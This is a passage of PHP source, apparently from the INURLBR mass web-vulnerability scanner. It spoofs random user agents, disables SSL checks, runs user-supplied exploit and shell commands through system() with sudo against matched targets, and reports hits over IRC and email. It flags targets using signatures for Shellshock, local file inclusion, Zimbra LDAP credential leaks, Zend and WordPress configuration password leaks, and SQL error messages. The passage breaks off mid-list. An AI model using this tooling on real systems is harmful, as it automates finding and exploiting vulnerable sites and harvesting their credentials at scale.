        'ar_KW', 'ar_LB', 'ar_LY', 'ar_MA', 'ar_OM', 'ar_QA', 'ar_SA', 'ar_SD', 'ar_SY', 'ar_TN', 'ar_AE', 'ar_YE', 'ar',
        'be_BY', 'be', 'bg_BG', 'bg', 'ca_ES', 'ca', 'zh_CN', 'zh_HK', 'zh_SG', 'zh_TW', 'zh', 'hr_HR', 'hr', 'cs_CZ', 'cs',
        'da_DK', 'da', 'nl_BE', 'nl_NL', 'nl', 'en_AU', 'en_CA', 'en_IN', 'en_IE', 'en_MT', 'en_NZ', 'en_PH', 'en_SG', 'en_ZA',
        'en_GB', 'en_US', 'en', 'et_EE', 'et', 'fi_FI', 'fi', 'fr_BE', 'fr_CA', 'fr_FR', 'fr_LU', 'fr_CH', 'fr', 'de_AT', 'de_DE',
        'de_LU', 'de_CH', 'de', 'el_CY', 'el_GR', 'el', 'iw_IL', 'iw', 'hi_IN', 'hu_HU', 'hu', 'is_IS', 'is', 'in_ID', 'in', 'ga_IE',
        'ga', 'it_IT', 'it_CH', 'it', 'ja_JP', 'ja_JP_JP', 'ja', 'ko_KR', 'ko', 'lv_LV', 'lv', 'lt_LT', 'lt', 'mk_MK', 'mk', 'ms_MY',
        'ms', 'mt_MT', 'mt', 'no_NO', 'no_NO_NY', 'no', 'pl_PL', 'pl', 'pt_PT', 'pt', 'ro_RO', 'ro', 'ru_RU', 'ru', 'sr_BA', 'sr_ME',
        'sr_CS', 'sr_RS', 'sr', 'sk_SK', 'sk', 'sl_SI', 'sl', 'es_AR', 'es_BO', 'es_CL', 'es_CO', 'es_CR', 'es_DO', 'es_EC', 'es_SV',
        'es_GT', 'es_HN', 'es_MX', 'es_NI', 'es_PA', 'es_PY', 'es_PE', 'es_PR', 'es_ES', 'es_US', 'es_UY', 'es_VE', 'es', 'sv_SE',
        'sv', 'th_TH', 'th_TH_TH', 'th', 'tr_TR', 'tr', 'uk_UA', 'uk', 'vi_VN', 'vi'
    );
    return $agentBrowser[rand(0, count($agentBrowser) - 1)] . '/' . rand(1, 20) . '.' . rand(0, 20) . ' (' . $agentSistema[rand(0, count($agentSistema) - 1)] . ' ' . rand(1, 7) . '.' . rand(0, 9) . '; ' . $locais[rand(0, count($locais) - 1)] . ';)';
}

################################################################################
#RESPONSIBLE FOR RUN COMMANDS IN TERMINAL the installation of facilities########
################################################################################

function __installDepencia() {

    echo __bannerlogo() . __plus();
    echo "\n{$_SESSION["c15"]}|_[ * ]__{$_SESSION["c0"]}\n";
    echo "         {$_SESSION["c15"]}|[EXTERNAL COMMAND INSTALLING PREMISES ]:: {$_SESSION["c11"]}\n";
    $dados = system("sudo apt-get install curl libcurl3 libcurl3-dev php5 php5-cli php5-curl", $dados) . __plus();
    sleep(1) . __plus();
    echo "{$_SESSION["c0"]}";
    if (empty($dados)) {

        return FALSE;
    }
    unset($dados);
    exit();
}

################################################################################
#RESPONSIBLE FOR RUN COMMANDS IN TERMINAL#######################################
################################################################################

function __command($commando, $alvo) {

    if (!is_null($commando)) {

        (strstr($commando, '_TARGET_') ||
                strstr($commando, '_TARGETFULL_') ||
                strstr($commando, '_TARGETIP_') ||
                strstr($commando, '_EXPLOIT_') ||
                strstr($commando, '_URI_') ||
                strstr($commando, '_URI_') ||
                strstr($commando, '_PORT_') ||
                strstr($commando, '_RANDOM_') ? NULL :
                        __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c2"]}SET PARAMETER - command correctly{$_SESSION["c0"]}\n"));

        $uri = parse_url($alvo['url_xpl']);

        $command[0] = str_replace("_TARGET_", "{$_SESSION["c8"]}" . __filterHostname($alvo['url_xpl']) . "{$_SESSION["c1"]}", $commando);
        $command[0] = str_replace('_TARGETIP_', "{$_SESSION["c9"]}{$_SESSION['config']['server_ip']}{$_SESSION["c1"]}", $command[0]);
        $command[0] = str_replace('_TARGETFULL_', "{$_SESSION["c14"]}{$alvo['url_clean']}{$_SESSION["c1"]}", $command[0]);
        $command[0] = str_replace('_TARGETXPL_', "{$_SESSION["c14"]}{$alvo['url_xpl']}{$_SESSION["c1"]}", $command[0]);
        $command[0] = str_replace("_EXPLOIT_", "{$_SESSION["c6"]}{$_SESSION['config']['exploit-command']}{$_SESSION["c1"]}", $command[0]);
        $command[0] = str_replace('_URI_', "{$_SESSION["c8"]}{$uri['path']}{$_SESSION["c1"]}", $command[0]);
        $command[0] = str_replace('_PORT_', "{$_SESSION["c9"]}{$alvo['url_port']}{$_SESSION["c1"]}", $command[0]);
        $command[0] = str_replace('_RANDOM_', "{$_SESSION["c15"]}" . random(5) . "{$_SESSION["c1"]}", $command[0]);

        $command[0] = __crypt($command[0]);

        $command[1] = str_replace("_TARGET_", __filterHostname($alvo['url_clean']), $commando);
        $command[1] = str_replace('_TARGETIP_', $_SESSION['config']['server_ip'], $command[1]);
        $command[1] = str_replace('_TARGETFULL_', $alvo['url_clean'], $command[1]);
        $command[1] = str_replace('_TARGETXPL_', $alvo['url_xpl'], $command[1]);
        $command[1] = str_replace("_EXPLOIT_", $_SESSION['config']['exploit-command'], $command[1]);
        $command[1] = str_replace("_URI_", $uri['path'], $command[1]);
        $command[1] = str_replace("_PORT_", $alvo['url_port'], $command[1]);
        $command[1] = str_replace("_RANDOM_", random(5), $command[1]);
        $command[1] = str_replace("\n", '', str_replace("\r", '', $command[1]));

        $command[1] = __crypt($command[1]);

        echo "\n{$_SESSION["c1"]}|_[ * ]__\n";
        echo "         |[ EXTERNAL COMMAND ]:: {$command[0]}{$_SESSION["c11"]}\n";
        $_ = array(0 => ($_SESSION['config']['popup']) ? 'sudo xterm -geometry 134x50+1900+0 -title "Auxiliary Window - INURLBR / COMMAND" -e ' : NULL, 1 => ($_SESSION['config']['popup']) ? ' > /dev/null &' : NULL);
        echo ($_SESSION['config']['popup'] ? "\t[!] opening auxiliary window...\n" : NULL);
        $dados = system($_[0] . $command[1] . $_[1], $dados);
        sleep(1) . __plus();

        echo $_SESSION["c0"];
    }
    if (empty($dados[0])) {

        return FALSE;
    }
    unset($dados);
}

################################################################################
#FILTER BY TAKING ONLY RESPONSIBLE URL HOSTNAME#################################
################################################################################

function __filterHostname($url) {

    $alvo_ = NULL;
    //#\b((((ht|f)tps?://*)|(www|ftp)\.)[a-zA-Z0-9-\.]+)#i - 1.0
    preg_match_all('@^(?:(ht|f)tps?://*)?([^/]+)@i', $url, $alvo_);
    return str_replace("/", '', str_replace("ftps:", '', str_replace("ftp:", '', str_replace("https:", '', str_replace("http:", '', $alvo_[0][0])))));
}

################################################################################
#RESPONSIBLE FOR ALL REQUESTS GET / POST THE SCRIPT#############################
################################################################################
/*
  curl_multi_init — Returns a new cURL multi handle
  (PHP 5) http://php.net/manual/en/function.curl-multi-init.php
 */

function __request_info($url_, $proxy = NULL, $postDados = NULL) {

    $url_ = __crypt($url_);
    $mh = curl_multi_init();
    $curl_array = array();
    $nodes = is_array($url_) ? $url_ : array($url_);

    foreach ($nodes as $i => $url) {

        $curl_array[$i] = curl_init($url);

        __plus();

        //FORMATANDO POST & EXECUTANDO urlencode EM CADA VALOR DO POST.
        if (not_isnull_empty($postDados) && is_array($postDados)) {

            foreach ($postDados as $campo => $valor) {

                $postDados_format .= "{$campo}=" . urlencode($valor) . '&';
            }

            $postDados_format = rtrim($postDados_format, '&');
            curl_setopt($curl_array[$i], CURLOPT_POST, count($postDados));
            curl_setopt($curl_array[$i], CURLOPT_POSTFIELDS, __crypt($postDados_format));
        }

        curl_setopt($curl_array[$i], CURLOPT_HTTPHEADER, array_merge(not_isnull_empty($_SESSION['config']['http-header']) ?
                                explode(',', __crypt($_SESSION['config']['http-header'])) : array(), array("Cookie: disclaimer_accepted=true")));
        curl_setopt($curl_array[$i], CURLOPT_USERAGENT, (not_isnull_empty($_SESSION['config']['user-agent'])) ?
                        __crypt($_SESSION['config']['user-agent']) : __setUserAgentRandom());
        curl_setopt($curl_array[$i], CURLOPT_REFERER, (not_isnull_empty($_SESSION['config']['url-reference'])) ?
                        __crypt($_SESSION['config']['url-reference']) : __setURLReferenceRandom());

        (!is_null($proxy) ? curl_setopt($curl_array[$i], CURLOPT_PROXY, $proxy) : NULL);
        (!is_null($_SESSION['config']['verifica_info'])) ? curl_setopt($curl_array[$i], CURLOPT_HEADER, 1) : NULL;
        (!is_null($_SESSION['config']['verifica_info']) && __validateOptions('3,6', $_SESSION['config']['debug']) ?
                        curl_setopt($curl_array[$i], CURLOPT_VERBOSE, 1) : NULL);

        __plus();
        curl_setopt($curl_array[$i], CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($curl_array[$i], CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($curl_array[$i], CURLOPT_FRESH_CONNECT, 1);
        curl_setopt($curl_array[$i], CURLOPT_RETURNTRANSFER, 1);

        curl_setopt($curl_array[$i], CURLOPT_CONNECTTIMEOUT, not_isnull_empty($_SESSION['config']['time-out']) ?
                        $_SESSION['config']['time-out'] : 5);

        curl_setopt($curl_array[$i], CURLOPT_TIMEOUT, not_isnull_empty($_SESSION['config']['time-out']) ?
                        $_SESSION['config']['time-out'] : 5);

        curl_setopt($curl_array[$i], CURLOPT_COOKIEFILE, not_isnull_empty($_SESSION['config']['file-cookie']) ?
                        $_SESSION['config']['file-cookie'] : 'cookie.txt');

        curl_setopt($curl_array[$i], CURLOPT_COOKIEJAR, not_isnull_empty($_SESSION['config']['file-cookie']) ?
                        $_SESSION['config']['file-cookie'] : 'cookie.txt');

        curl_multi_add_handle($mh, $curl_array[$i]);
    }
    $running = NULL;
    do {

        usleep(100);
        curl_multi_exec($mh, $running);
    } while ($running > 0);
    $ret = array();
    foreach ($nodes as $i => $url) {

        $ret[0] = curl_multi_getcontent($curl_array[$i]);
        $ret[1] = curl_getinfo($curl_array[$i]);
        $ret[2] = curl_error($curl_array[$i]);
    }
    foreach ($nodes as $i => $url) {
        curl_multi_remove_handle($mh, $curl_array[$i]);
    }

    $status = NULL;
    preg_match_all('(HTTP.*)', $ret[0], $status['http']);
    preg_match_all('(Server:.*)', $ret[0], $status['server']);
    preg_match_all('(X-Powered-By:.*)', $ret[0], $status['X-Powered-By']);

    __plus();
    $ret[3] = str_replace("\r", '', str_replace("\n", '', "{$status['http'][0][0]}, {$status['server'][0][0]}  {$status['X-Powered-By'][0][0]}"));
    __debug(array('debug' => "[ BODY ]{$ret[0]}", 'function' => '__request_info'), 4);

    __plus();
    __debug(array('debug' => "[ URL ]{$url_}", 'function' => '__request_info'), 2);

    __plus();
    curl_multi_close($mh) . unlink('cookie.txt');

    __plus();
    unset($curl_array);
    return isset($ret[0]) ? array('corpo' => $ret[0], 'server' => $ret[1], 'error' => $ret[2], 'info' => $ret[3]) : FALSE;
}

################################################################################
#CAPTURE INFORMATION SERVER AND VALIDATE FAULTS#################################
################################################################################

function __infoServer($url_, $postDados = NULL) {

    __plus();
    $_SESSION['config']['verifica_info'] = 1;
    $resultado = __request_info($url_, $_SESSION["config"]["proxy"], $postDados);
    __plus();
    if (isset($resultado['corpo'])) {
        if (!is_null($_SESSION['config']['extrai-email'])) {

            __plus();
            return __extractEmail($resultado['corpo'], $url_);
        }

        if (!is_null($_SESSION['config']['extrai-url'])) {

            __plus();
            return __extractURLs($resultado['corpo'], $url_);
        }

        if (not_isnull_empty($_SESSION['config']['regexp-filter'])) {

            __plus();
            return __extractRegCustom($resultado['corpo'], $url_);
        }

        if (not_isnull_empty($_SESSION['config']['target']) && $_SESSION['config']['tipoerro'] == 5) {

            __plus();
            return __checkURLs($resultado, $url_);
        }

        $ifcode = not_isnull_empty($_SESSION['config']['ifcode']) &&
                strstr($resultado['server']['http_code'], $_SESSION['config']['ifcode']) ?
                "CODE_HTTP_FOUND: {$_SESSION['config']['ifcode']} / " : NULL;


        $ifredirect = not_isnull_empty($_SESSION['config']['ifredirect']) &&
                (strstr($resultado['server']['redirect_url'], $_SESSION['config']['ifredirect'])) ?
                'VALUE URL REDIRECT FOUND' : NULL;

        $_SESSION['config']['erroReturn'] = $ifredirect . $ifcode . __checkError($resultado['corpo']);
        __plus();
        $_SESSION['config']['curl_getinfo'] = $resultado['server'];
        $_SESSION['config']['error_conection'] = (not_isnull_empty($resultado['error']) ? $resultado['error'] : NULL);
        $_SESSION['config']['server_ip'] = (!is_null($resultado['server']['primary_ip']) ? $resultado['server']['primary_ip'] : NULL);
        $_SESSION['config']['vull_style'] = (not_isnull_empty($_SESSION['config']['erroReturn'])) ?
                "{$_SESSION["c4"]}( POTENTIALLY VULNERABLE ){$_SESSION["c0"]}  \033[1m \033[32m" . __cli_beep() : NULL;
        $_SESSION['config']['resultado_valores'].=(not_isnull_empty($_SESSION['config']['erroReturn'])) ? "{$url_}\n" : NULL;
        __plus();
        $url_ = ($_SESSION['config']['alexa-rank']) ? ", RANK ALEXA: " . __positionAlexa($url_) : NULL;
        __plus();
        $_SESSION['config']['info_ip'] = __infoIP($resultado['server']['primary_ip'], 1);
        __plus();
    } else {
        return FALSE;
    }
    __plus();

    return "{$resultado['info']}, IP:{$resultado['server']['primary_ip']}:{$resultado['server']['primary_port']} {$url_}";
}

################################################################################
#ERROR MAIN PROCESS RESPONSIBLE FOR ALL VALIDATION OF MOTOR#####################
################################################################################

function __processUrlExec($url, $contUrl) {

    __plus();
    if (is_null($url) || empty($url)) {

        return FALSE;
    }

    $host = (!is_null($_SESSION['config']['replace'])) ?
            __replace($_SESSION['config']['replace'], urldecode($_SESSION['config']['tipoerro'] == 3 ? __filterHostname($url) : ($url))) :
            urldecode($_SESSION['config']['tipoerro'] == 3 ? __filterHostname($url) : ($url));

    $target_['url_xpl'] = __remove($_SESSION['config']['remove'], __mountURLExploit(!is_null($_SESSION['config']['url']) ? $_SESSION['config']['url'] . $host : $host));
    $info = __infoServer($target_['url_xpl'], $_SESSION['config']['exploit-post']);
    $target_['url_clean'] = ($_SESSION['config']['tipoerro'] == 4) ? $_SESSION['config']['url'] . $host : urldecode($url);

    __plus();

    if ($_SESSION['config']['tipoerro'] != 5 && is_null($_SESSION['config']['extrai-email']) &&
            is_null($_SESSION['config']['extrai-url']) && is_null($_SESSION['config']['regexp-filter'])) {

        $ifredirect = strstr($_SESSION['config']['curl_getinfo']['redirect_url'], $_SESSION['config']['ifredirect']) ?
                "{$_SESSION["c4"]}{$_SESSION['config']['curl_getinfo']['redirect_url']}" : NULL;
        $exget = (not_isnull_empty($_SESSION['config']['exploit-get']) ? ' _/GET=> ' . $_SESSION['config']['exploit-get'] : NULL);
        $expost = (not_isnull_empty($_SESSION['config']['exploit-post']) ? ' _/POST=> ' . $_SESSION['config']['exploit-post_str'] : NULL);
        $valid_return = (not_isnull_empty($_SESSION['config']['erroReturn'])) ? TRUE : FALSE;
        $info = ($valid_return) ? "{$_SESSION["c4"]}{$info}" : $info;
        $target_ip = ($valid_return) ? "{$_SESSION["c4"]}{$_SESSION['config']['info_ip']}" : $_SESSION['config']['info_ip'];

        $anime = ($valid_return) ? '[ ! ]' : '[ - ]';
        echo __plus() . "\n";

        echo "{$_SESSION["c1"]}{$_SESSION['config']['line']}{$_SESSION["c0"]}\n";
        echo "{$_SESSION["c1"]}|_[ + ] [{$_SESSION["c1"]} {$contUrl} / {$_SESSION['config']['total_url']} {$_SESSION["c1"]}]{$_SESSION["c9"]}-[" . date("H:i:s") . "]{$_SESSION["c1"]} {$anime} {$_SESSION["c0"]}\n";
        echo "{$_SESSION["c1"]}|_[ + ] {$_SESSION["c0"]}{$_SESSION["c7"]}Target:: {$_SESSION["c1"]}[{$_SESSION["c9"]} {$_SESSION['config']['vull_style']}{$target_['url_clean']}{$_SESSION["c1"]} ]{$_SESSION["c0"]}\n";
        echo "{$_SESSION["c1"]}|_[ + ] {$_SESSION["c0"]}{$_SESSION["c7"]}Exploit:: {$_SESSION["c0"]}{$_SESSION["c3"]}{$exget}{$expost}{$_SESSION["c0"]}\n";
        echo (not_isnull_empty($_SESSION['config']['replace'])) ? ("{$_SESSION["c1"]}|_[ + ] {$_SESSION["c0"]}{$_SESSION["c7"]}Replace:: {$_SESSION["c0"]}{$_SESSION["c3"]}{$_SESSION['config']['replace']}{$_SESSION["c0"]}\n") : NULL;
        echo (not_isnull_empty($_SESSION['config']['remove'])) ? ("{$_SESSION["c1"]}|_[ + ] {$_SESSION["c0"]}{$_SESSION["c7"]}Remove:: {$_SESSION["c0"]}{$_SESSION["c3"]}{$_SESSION['config']['remove']}{$_SESSION["c0"]}\n") : NULL;
        echo (isset($_SESSION['config']['cms-check-resultado'])) ? ("{$_SESSION["c1"]}|_[ + ] {$_SESSION["c0"]}{$_SESSION["c7"]}CMS check:: {$_SESSION["c0"]}{$_SESSION["c3"]}{$_SESSION['config']['cms-check-resultado']}{$_SESSION["c0"]}\n") : NULL;
        echo "{$_SESSION["c1"]}|_[ + ] {$_SESSION["c0"]}{$_SESSION["c7"]}Information Server:: {$_SESSION["c0"]}{$_SESSION["c9"]}{$info}{$_SESSION["c1"]}\n";
        echo "{$_SESSION["c1"]}|_[ + ] {$_SESSION["c0"]}{$_SESSION["c7"]}More details:: {$_SESSION["c0"]}{$_SESSION["c9"]}{$target_ip}{$_SESSION["c1"]}\n";
        echo "{$_SESSION["c1"]}|_[ + ] {$_SESSION["c0"]}{$_SESSION["c7"]}Found:: {$_SESSION["c9"]}" . ($valid_return ? "{$_SESSION["c4"]}{$_SESSION['config']['erroReturn']}" : "UNIDENTIFIED") . "{$_SESSION["c0"]}";
        echo (not_isnull_empty($ifredirect) ? "\n{$_SESSION["c1"]}|_[ + ] {$_SESSION["c0"]}{$_SESSION["c7"]}URL REDIRECT:: {$_SESSION["c9"]}{$ifredirect}{$_SESSION["c0"]}" : NULL);
        echo (not_isnull_empty($_SESSION['config']['error_conection']) ? "\n{$_SESSION["c1"]}|_[ + ] {$_SESSION["c0"]}{$_SESSION["c7"]}ERROR CONECTION:: {$_SESSION["c2"]}{$_SESSION['config']['error_conection']}{$_SESSION["c0"]}" : NULL);
        ($valid_return ? __saveValue($_SESSION['config']['arquivo_output'], $target_['url_xpl'], 1) : NULL);
        echo ($_SESSION['config']['sendmail'] ? "\n{$_SESSION["c1"]}|_[ + ] {$_SESSION["c0"]}{$_SESSION["c7"]}SEND MAIL:: {$_SESSION["c9"]}" . (($valid_return) ? "{$_SESSION["c4"]}" : NULL) . __sendMail($_SESSION['config']['sendmail'], $target_['url_xpl']) . "{$_SESSION["c0"]}" : NULL);
        (not_isnull_empty($_SESSION['config']['arquivo_output_all']) ? __saveValue($_SESSION['config']['arquivo_output_all'], $target_['url_xpl'], NULL) : NULL);
        __plus();

        if ($valid_return) {

            (not_isnull_empty($_SESSION['config']['irc']['irc_connection']) ?
                            __ircMsg($_SESSION['config']['irc'], "{$_SESSION['config']['erroReturn']}::: {$target_['url_xpl']}") : NULL);
            __plus();

            (not_isnull_empty($_SESSION['config']['command-vul']) ? __command($_SESSION['config']['command-vul'], $target_) : NULL);
            __plus();

            (not_isnull_empty($_SESSION['config']['exploit-vul-id']) ?
                            __configExploitsExec($_SESSION['config']['exploit-vul-id'], $target_) : NULL);
            __plus();
        }

        (not_isnull_empty($_SESSION['config']['command-all']) ? __command($_SESSION['config']['command-all'], $target_) : NULL);
        __plus();

        (not_isnull_empty($_SESSION['config']['sub-file']) &&
                is_array($_SESSION['config']['sub-file']) ? __subExecExploits($target_['url_xpl'], $_SESSION['config']['sub-file']) : NULL);
        __plus();

        (not_isnull_empty($_SESSION['config']['exploit-all-id']) ? __configExploitsExec($_SESSION['config']['exploit-all-id'], $target_) : NULL);
        __plus();

        ($_SESSION['config']['robots'] ? __getValuesRobots($host) : NULL);
        __plus();

        (not_isnull_empty($_SESSION['config']['port-scan']) ? __portScan(array(0 => $target_, 1 => $_SESSION['config']['port-scan'])) : NULL);
        __plus();

        __timeSec('delay', "\n");
    }
}

################################################################################
#PRINT MESSAGE AND OUT OF THE PROCESS###########################################
################################################################################

function __getOut($msg) {
    __ircQuit($_SESSION['config']['irc']);
    print_r($msg);
    exit(1);
}

################################################################################
#ERROR MAIN PROCESS RESPONSIBLE FOR ALL VALIDATION OF ENGINE####################
################################################################################

function __process($resultadoURL) {

    __plus();
    $resultadoURL[0] = (is_array($resultadoURL) ? array_unique(array_filter($resultadoURL)) : $resultadoURL);
    $resultadoURL[0] = ($_SESSION['config']['unique'] ? __filterDomainUnique($resultadoURL[0]) : $resultadoURL[0]);

    $resultadoURL[0] = (not_isnull_empty($_SESSION['config']['ifurl']) ? __filterURLif($resultadoURL[0]) : $resultadoURL[0]);
    $_SESSION['config']['total_url'] = count($resultadoURL[0]);

    echo "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c12"]}[ TOTAL FOUND VALUES ]::{$_SESSION["c1"]} [ {$_SESSION['config']['total_url']} ]{$_SESSION["c0"]}\n";
    __debug(array('debug' => $resultadoURL[0], 'function' => '__process'), 3);

    if (count($resultadoURL[0]) > 0) {

        $_SESSION['config']['irc']['irc_connection'] = (not_isnull_empty($_SESSION['config']['irc']['conf']) ? __ircConect($_SESSION['config']['irc']) : NULL);
        $_SESSION['config']['irc']['my_fork'] = pcntl_fork();

        if ($_SESSION['config']['irc']['my_fork'] == 0) {

            (not_isnull_empty($_SESSION['config']['irc']['irc_connection']) ? __ircPong($_SESSION['config']['irc']) : NULL);
            exit(0);
        } else if ($_SESSION['config']['irc']['my_fork'] == -1) {

            __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c2"]}ERROR Fork failed{$_SESSION["c0"]}\n");
        }

        $_SESSION['config']['user-agent'] = ($_SESSION['config']['shellshock']) ? $_SESSION['config']['user_agent_xpl'] : $_SESSION['config']['user-agent'];
        foreach ($resultadoURL[0] as $url) {

            __plus();
            $url = urldecode(not_isnull_empty($_SESSION['config']['target']) ?
                            $_SESSION['config']['target'] . $url : $url);

            if (__validateURL($url) || not_isnull_empty($_SESSION['config']['abrir-arquivo'])) {

                __processUrlExec(__filterURLTAG($url), $_SESSION["config"]["contUrl"] ++);
                __plus();
            }
        }
    } else {

        print_r("{$_SESSION["c1"]}[ INFO ]{$_SESSION["c2"]} Not a satisfactory result was found!{$_SESSION["c0"]}\n");
    }
}

################################################################################
#ERRORS STANDARDS OF SCRIPT VALIDATE WITH HTML RECEIVED#########################
################################################################################

function __checkError($html_) {


    if (__validateOptions($_SESSION['config']['tipoerro'], '2')) {

        $validation['ERROR-CUSTOM'] = not_isnull_empty($_SESSION['config']['achar']) ? $_SESSION['config']['achar'] : NULL;
    }

    if (__validateOptions('1,3,4', $_SESSION['config']['tipoerro'])) {

        if (__validateOptions('3,4', $_SESSION['config']['tipoerro'])) {

            $validation['ERROR-CUSTOM'] = not_isnull_empty($_SESSION['config']['achar']) ? $_SESSION['config']['achar'] : NULL;
        }

        /* [*]SHELLSHOCK
         * (CVE-2014-6271, CVE-2014-6277,
         * CVE-2014-6278, CVE-2014-7169, 
         * CVE-2014-7186, CVE-2014-7187) 
         * is a vulnerability in GNU's bash shell that gives attackers access 
         * to run remote commands on a vulnerable system. */
        $validation['SHELLSHOCK-01'] = '99887766555';

        /* [*]LOCAL FILE INCLUSION
         * Local File Inclusion (also known as LFI) is the process of including 
         * files, that are already locally present on the server, through the 
         * exploiting of vulnerable inclusion procedures implemented in the 
         * application. 
         * https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion */
        $validation['LOCAL-FILE-INCLUSION-01'] = '/root:/';
        $validation['LOCAL-FILE-INCLUSION-02'] = 'root:x:0:0:';
        $validation['LOCAL-FILE-INCLUSION-03'] = 'mysql:x:';

        /* [*]ZIMBRA MAIL
         * Zimbra 0day exploit / Privilegie escalation via LFI
         * This script exploits a Local File Inclusion in
         * /res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz
         * which allows us to see localconfig.xml
         * that contains LDAP root credentials wich allow us to make requests in
         * /service/admin/soap API with the stolen LDAP credentials to create user
         * with administration privlegies
         * and gain acces to the Administration Console.
         * https://www.exploit-db.com/exploits/30085/ */
        $validation['ZIMBRA-WEB-MAIL-01'] = 'zimbra_user';
        $validation['ZIMBRA-WEB-MAIL-02'] = 'zimbra_ldap_password';
        $validation['ZIMBRA-WEB-MAIL-03'] = 'ldap_replication_password';
        $validation['ZIMBRA-WEB-MAIL-04'] = 'ldap_root_password';
        $validation['ZIMBRA-WEB-MAIL-05'] = 'ldap_nginx_password';
        $validation['ZIMBRA-WEB-MAIL-06'] = 'mailboxd_keystore_password';
        $validation['ZIMBRA-WEB-MAIL-07'] = 'zimbra_mysql_password';
        $validation['ZIMBRA-WEB-MAIL-08'] = 'mysql_root_password';
        $validation['ZIMBRA-WEB-MAIL-10'] = 'mailboxd_truststore_password';
        $validation['ZIMBRA-WEB-MAIL-11'] = 'ldap_postfix_password';
        $validation['ZIMBRA-WEB-MAIL-12'] = 'ldap_amavis_password';

        /* [*]ZEND FRAMEWORK
         * Zend-Framework Full Info Disclosure
         * The username and password of the database may be obtained trough 
         * the "application.ini" file
         * https://www.exploit-db.com/exploits/29921/ */
        $validation['ZEND-FRAMEWORK-01'] = 'mail.transport.username';
        $validation['ZEND-FRAMEWORK-02'] = 'mail.transport.password';
        $validation['ZEND-FRAMEWORK-03'] = 'db.params.username';
        $validation['ZEND-FRAMEWORK-04'] = 'db.params.password';
        $validation['ZEND-FRAMEWORK-05'] = 'db.params.dbname';

        /* [*]CMS WORDPRESS
         * As the name suggests, if the web application doesn’t check the file 
         * name required by the user, any malicious user can exploit this 
         * vulnerability to download sensitive files from the server.
         * Arbitrary File Download vulnerability file wp-config.php
         * http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
         * http://www.acunetix.com/vulnerabilities/web/wordpress-plugin-slider-revolution-arbitrary-file-disclosure */
        $validation['CMS-WORDPRESS-01'] = "define('DB_NAME'";
        $validation['CMS-WORDPRESS-02'] = "define('DB_USER'";
        $validation['CMS-WORDPRESS-03'] = "define('DB_PASSWORD'";
        $validation['CMS-WORDPRESS-04'] = "define('DB_HOST'";

        /* [*]ERROR MARIADB
         * MariaDB is a drop-in replacement for MySQL.
         * MariaDB strives to be the logical choice for database professionals 
         * looking for a robust, scalable, and reliable SQL server. To accomplish 
         * this, the MariaDB Foundation work closely and cooperatively with the 
         * larger community of users and developers in the true spirit of Free 
         * and open source software, and release software in a manner that 
         * balances predictability with reliability.
         * https://mariadb.org/en/about/ */
        $validation['MARIADB-01'] = 'MariaDB server version for the right syntax';

        /* [*]ERROR MYSQL
         * MySQL is a database management system (DBMS), which uses the SQL 
         * (Structured Query Language, English Structured Query Language) as 
         * interface. It is currently one of the most popular databases, with 
         * more than 10 million installations worldwide
         * https://www.mysql.com/ 
         * http://php.net/manual/en/security.database.sql-injection.php
         */
        $validation['MYSQL-AND-MARIADB'] = 'You have an error in your SQL syntax;';
        $validation['MYSQL-03'] = 'Warning: mysql_';
        $validation['MYSQL-04'] = 'function.mysql';
        $validation['MYSQL-05'] = 'MySQL result index';
        $validation['MYSQL-07'] = 'MySQL Error';
        $validation['MYSQL-08'] = 'MySQL ODBC';
        $validation['MYSQL-09'] = 'MySQL Driver';
        $validation['MYSQL-10'] = 'mysqli.query';
        $validation['MYSQL-11'] = 'num_rows';
        $validation['MYSQL-12'] = 'mysql error:';
        $validation['MYSQL-13'] = 'supplied argument is not a valid MySQL result resource';
        $validation['MYSQL-14'] = 'on MySQL result index';
        $validation['MYSQL-15'] = 'Error Executing Database Query';
        $validation['MYSQL-01'] = 'mysql_';

        /* [*]ERROR MICROSOFT
         * MICROSOFT TECHNOLOGY
         * http://www.microsoft.com/pt-br/server-cloud/products/sql-server/
         * https://products.office.com/pt-br/access 
         * https://www.owasp.org/index.php/Testing_for_SQL_Server */
        $validation['MICROSOFT-01'] = 'Microsoft JET Database';
        $validation['MICROSOFT-02'] = 'ADODB.Recordset';
        $validation['MICROSOFT-03'] = '500 - Internal server error';
        $validation['MICROSOFT-04'] = 'Microsoft OLE DB Provider';
        $validation['MICROSOFT-05'] = 'Unclosed quotes';
        $validation['MICROSOFT-06'] = 'ADODB.Command';
        $validation['MICROSOFT-07'] = 'ADODB.Field error';
        $validation['MICROSOFT-08'] = 'Microsoft VBScript';
        $validation['MICROSOFT-09'] = 'Microsoft OLE DB Provider for SQL Server';
        $validation['MICROSOFT-10'] = 'Unclosed quotation mark';
        $validation['MICROSOFT-11'] = 'Microsoft OLE DB Provider for Oracle';
        $validation['MICROSOFT-14'] = 'Active Server Pages error';
        $validation['MICROSOFT-15'] = 'OLE/DB provider returned message';
        $validation['MICROSOFT-16'] = 'OLE DB Provider for ODBC';
        $validation['MICROSOFT-17'] = "error '800a0d5d'";
        $validation['MICROSOFT-18'] = "error '800a000d'";
        $validation['MICROSOFT-19'] = 'Unclosed quotation mark after the character string';
        $validation['MICROSOFT-20'] = '[Microsoft][SQL Server Native Client 11.0][SQL Server]';
        $validation['MICROSOFT-21'] = 'Warning: odbc_';

        /* #[*]ERROR ORACLE
         * - DBMS currently marketed by Oracle, who was born in 1979 and was 
         * the first relational BD sold worldwide;
         * - Latest version: Oracle Database 11G;
         * http://www.oracle.com/br/solutions/midsize/oracle-products/database/index.html
         * https://www.blackhat.com/presentations/bh-usa-05/bh-us-05-fayo.pdf */
        $validation['ORACLE-01'] = 'ORA-00921: unexpected end of SQL command';
        $validation['ORACLE-02'] = 'ORA-01756';
        $validation['ORACLE-03'] = 'ORA-';
        $validation['ORACLE-04'] = 'Oracle ODBC';
        $validation['ORACLE-05'] = 'Oracle Error';
        $validation['ORACLE-06'] = 'Oracle Driver';
        $validation['ORACLE-07'] = 'Oracle DB2';
        $validation['ORACLE-08'] = 'error ORA-';
